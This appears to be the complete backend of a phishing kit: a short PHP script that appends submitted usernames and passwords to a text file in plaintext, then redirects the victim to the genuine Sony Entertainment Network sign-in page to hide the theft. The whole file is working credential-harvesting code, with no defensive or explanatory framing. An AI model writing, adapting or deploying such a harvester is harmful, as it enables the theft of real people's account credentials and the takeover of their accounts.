<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://id.sonyentertainmentnetwork.com/signin/?#/signin?entry=%2Fsignin/');
exit();
